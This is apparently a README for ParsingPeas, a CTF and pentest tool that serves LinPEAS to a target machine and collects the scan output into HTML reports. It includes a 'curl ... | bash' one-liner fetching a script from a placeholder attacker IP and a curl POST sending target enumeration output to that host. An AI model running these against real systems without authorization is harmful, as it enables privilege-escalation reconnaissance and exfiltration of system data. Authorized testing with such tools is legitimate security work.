# ParsingPeas 🥒

**Automated LinPEAS/WinPEAS Output Collection & Interactive HTML Reporting**

Streamline privilege escalation enumeration in isolated CTF environments by automatically transferring scan outputs to your attack host and generating searchable HTML reports.

[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
[![Python 3.8+](https://img.shields.io/badge/python-3.8+-blue.svg)](https://www.python.org/downloads/)
[![LinPEAS](https://img.shields.io/badge/LinPEAS-supported-green.svg)](https://github.com/peass-ng/PEASS-ng)

---

## Overview

ParsingPeas eliminates manual file transfers during privilege escalation enumeration. Execute one command on the target machine to automatically:

1. Download LinPEAS from your Kali host (no internet required on target)
2. Execute the privilege escalation scan
3. Transfer results back to your Kali host via HTTP POST
4. Generate an interactive, categorized HTML report
5. Clean up temporary files on the target

**Ideal for CTF and lab environments** where target machines lack internet access.

---

## Key Features

- **Zero Manual Transfer**: Automated end-to-end workflow from scan execution to report generation
- **Isolated Network Support**: Serves scripts from your Kali host—no internet required on targets
- **Non-Interactive Execution**: Patched sudo handling prevents scan hangs from password prompts
- **Interactive HTML Reports**: Collapsible sections, color-coded findings, and search functionality
- **Critical Finding Extraction**: Automatically highlights high-severity vulnerabilities
- **Robust Transfer**: Chunked uploads with retry logic and checksum validation
- **Multi-Session Support**: Handle concurrent scans from multiple targets

---

## Quick Start

### Prerequisites

- Kali Linux (or any Linux attack host)
- Python 3.8+
- Network connectivity between attack host and target

### Installation

```bash
git clone https://github.com/YuvalMil/ParsingPeas.git
cd ParsingPeas

# Download LinPEAS/WinPEAS scripts from GitHub
./setup.sh

# Install Python dependencies
pip3 install -r requirements.txt

# Start the receiver server
python3 receiver.py
```

The receiver will start on `http://0.0.0.0:8000`

### Usage

**On Target Machine:**

```bash
# Replace YOUR_KALI_IP with your Kali machine's IP address
curl -sSL http://YOUR_KALI_IP:8000/get-script | bash
```

**View Reports:**

Navigate to `http://YOUR_KALI_IP:8000` in your browser to access the status page and generated reports.

---

## Architecture

```
┌──────────────────────────────────────────────────────────┐
│  TARGET MACHINE (No Internet Required)                   │
│                                                           │
│  1. curl http://KALI_IP:8000/get-script | bash           │
│     ↓                                                     │
│  2. Downloads wrapper.sh + linpeas.sh from Kali          │
│     ↓                                                     │
│  3. Executes LinPEAS scan                                │
│     ↓                                                     │
│  4. HTTP POST output to Kali                             │
└────────────────────────┬─────────────────────────────────┘
                         │
                         ▼
┌──────────────────────────────────────────────────────────┐
│  KALI HOST (receiver.py)                                 │
│                                                           │
│  1. Receives scan output via HTTP POST                   │
│     ↓                                                     │
│  2. Validates checksum & saves raw output                │
│     ↓                                                     │
│  3. Invokes parser.py                                    │
│     ↓                                                     │
│  4. Generates interactive HTML report                    │
│     ↓                                                     │
│  5. Serves reports via /reports/<filename>               │
└──────────────────────────────────────────────────────────┘
```

### Key Components

- **`receiver.py`**: Flask-based HTTP server handling script distribution and output collection
- **`wrapper.sh`**: Target-side orchestration script with automatic cleanup
- **`parser.py`**: ANSI-aware parser generating categorized HTML reports from LinPEAS output
- **`setup.sh`**: Downloads latest LinPEAS/WinPEAS releases from PEASS-ng repository

---

## API Endpoints

| Endpoint | Method | Description |
|----------|--------|-------------|
| `/` | GET | Status page with active sessions and report links |
| `/get-script` | GET | Serves wrapper.sh with Kali IP pre-configured |
| `/get-linpeas` | GET | Serves linpeas.sh for Linux targets |
| `/get-winpeas` | GET | Serves winpeas.exe for Windows targets (WIP) |
| `/upload` | POST | Accepts scan output with metadata headers |
| `/reports/<file>` | GET | Serves generated HTML reports and JSON data |
| `/health` | GET | Health check endpoint |

### Upload Headers

```bash
X-Session-ID: scan_<timestamp>_<pid>
X-Hostname: <target_hostname>
X-Scan-Type: linpeas|winpeas
```

---

## Configuration

Edit `receiver.py` constants to customize:

```python
OUTPUT_DIR = "./received_outputs"   # Raw scan output storage
REPORTS_DIR = "./reports"            # Generated HTML reports
SCRIPTS_DIR = "./scripts"            # LinPEAS/WinPEAS binaries
MAX_UPLOAD_SIZE = 500 * 1024 * 1024  # 500MB limit
```

Change server port in the final line:
```python
app.run(host='0.0.0.0', port=8000, debug=False, threaded=True)
```

---

## Advanced Usage

### Manual Transfer

If the one-liner fails, execute steps separately:

```bash
# On target
curl http://KALI_IP:8000/get-linpeas -o /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh > /tmp/output.txt

# Transfer output
curl -X POST \
  -H "X-Hostname: $(hostname)" \
  -H "X-Scan-Type: linpeas" \
  --data-binary @/tmp/output.txt \
  http://KALI_IP:8000/upload
```

### Local Parsing

Parse existing LinPEAS output files:

```bash
python3 parser.py /path/to/linpeas_output.txt
# Report saved to ./reports/
```

---

## Troubleshooting

### Target Cannot Download Script

1. **Verify connectivity**: `ping KALI_IP` from target
2. **Check receiver status**: `curl http://KALI_IP:8000/health` from target
3. **Firewall rules**: Ensure port 8000 is open on Kali
   ```bash
   sudo ufw allow 8000/tcp
   ```

### Scripts Not Found (404 Error)

Run setup script to download LinPEAS/WinPEAS:
```bash
./setup.sh
```

Or manually download to `./scripts/`:
```bash
mkdir -p scripts
wget -O scripts/linpeas.sh https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x scripts/linpeas.sh
```

### Upload Fails / Transfer Errors

- Check disk space on Kali host
- Verify network stability (large transfers may timeout)
- Increase `MAX_UPLOAD_SIZE` in `receiver.py` if needed
- Review receiver logs for HTTP error codes

### Scan Hangs at "sudo -l" Check

This is resolved in the latest version via non-interactive sudo patching. Update to the latest commit:
```bash
git pull
```

---

## Security Considerations

⚠️ **For Authorized Testing Only**

This tool is designed for legitimate penetration testing and CTF competitions. Unauthorized use is illegal.

**Security Notes:**
- No authentication on HTTP endpoints—use only in isolated lab environments
- Consider adding reverse proxy with authentication for production assessments
- Implement firewall rules to restrict access to trusted subnets
- Use VPN or SSH tunneling when operating over untrusted networks
- Review uploaded content before executing on production systems

---

## Roadmap

- [ ] Full WinPEAS support with Windows wrapper script
- [ ] Enhanced critical finding detection (exploit-db integration)
- [ ] Report comparison/diff for tracking changes across scans
- [ ] JSON export for integration with other tools
- [ ] Authentication layer (basic auth / API tokens)
- [ ] TLS/SSL support for encrypted transfers
- [ ] Web UI improvements (dark/light theme toggle, search)

---

## Contributing

Contributions welcome! Areas for improvement:

- WinPEAS wrapper implementation (`wrapper.ps1`)
- Parser enhancements (better ANSI handling, finding categorization)
- HTML report UI/UX improvements
- Test coverage and CI/CD integration
- Documentation and examples

**Development Setup:**
```bash
git clone https://github.com/YuvalMil/ParsingPeas.git
cd ParsingPeas
pip3 install -r requirements.txt
# Make changes and submit PR
```

---

## License

MIT License - see [LICENSE](LICENSE) file for details.

---

## Credits

Built upon the excellent [PEASS-ng](https://github.com/peass-ng/PEASS-ng) project by [@carlospolop](https://github.com/carlospolop).

Special thanks to the privilege escalation research community.

---

**Simplifying privilege escalation enumeration, one scan at a time** 🥒
